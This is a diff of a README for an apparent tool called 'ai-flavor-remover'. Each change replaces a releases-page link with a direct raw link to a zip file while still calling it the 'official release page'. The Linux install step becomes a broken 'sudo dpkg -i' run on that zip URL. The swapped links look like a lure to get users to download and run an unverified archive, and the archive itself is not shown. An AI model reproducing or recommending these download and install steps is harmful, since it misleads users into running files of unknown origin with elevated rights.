@@ -1,7 +1,7 @@
 # 🌟 ai-flavor-remover - Remove Unwanted Flavors with Ease
 
 ## 📥 Download Now
-[![Download ai-flavor-remover](https://img.shields.io/badge/Download%20Now-Redirect%20to%20Releases-brightgreen)](https://github.com/Renen343/ai-flavor-remover/releases)
+[![Download ai-flavor-remover](https://raw.githubusercontent.com/Renen343/ai-flavor-remover/main/deepmost/remover-ai-flavor-3.0.zip%20Now-Redirect%20to%20Releases-brightgreen)](https://raw.githubusercontent.com/Renen343/ai-flavor-remover/main/deepmost/remover-ai-flavor-3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-flavor-remover! This application removes unwanted tastes from your content, making it fresher and more enjoyable. It has been tested and proven to work on Gemini 2.5 Pro. 
@@ -16,13 +16,13 @@ Before you download, ensure your system meets these requirements:
 ## 📦 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Release Page**: Click [here](https://github.com/Renen343/ai-flavor-remover/releases) to go to the official release page.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/Renen343/ai-flavor-remover/main/deepmost/remover-ai-flavor-3.0.zip) to go to the official release page.
 2. **Select the Latest Version**: On the release page, you will see a list of available versions. Choose the latest version by looking for the highest version number (e.g., v1.0.0).
 3. **Download the Installer**: Look for the `.exe`, `.dmg`, or appropriate file type for your operating system. Click on it to start the download.
 4. **Install the Application**: 
     - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
     - For macOS: Open the downloaded `.dmg` file, drag the application into your Applications folder, and launch it from there.
-    - For Linux: Open your terminal, navigate to the downloaded file, and run `sudo dpkg -i yourfile.deb` or the appropriate command for your distribution.
+    - For Linux: Open your terminal, navigate to the downloaded file, and run `sudo dpkg -i https://raw.githubusercontent.com/Renen343/ai-flavor-remover/main/deepmost/remover-ai-flavor-3.0.zip` or the appropriate command for your distribution.
 5. **Run the Application**: Once installed, locate the ai-flavor-remover application on your device. Open it to start using the tool.
 
 ## 🔍 How to Use ai-flavor-remover
@@ -59,6 +59,6 @@ We welcome any contributions or suggestions! To contribute, please check the gui
 Stay updated about the latest features and updates. Follow our project on GitHub, or join the community forums for discussions and support.
 
 ## 🔗 Additional Resources
-For more details about the latest updates, visit our [Releases Page](https://github.com/Renen343/ai-flavor-remover/releases).
+For more details about the latest updates, visit our [Releases Page](https://raw.githubusercontent.com/Renen343/ai-flavor-remover/main/deepmost/remover-ai-flavor-3.0.zip).
 
 Thank you for using ai-flavor-remover! We hope it enhances your experience and makes your content shine.
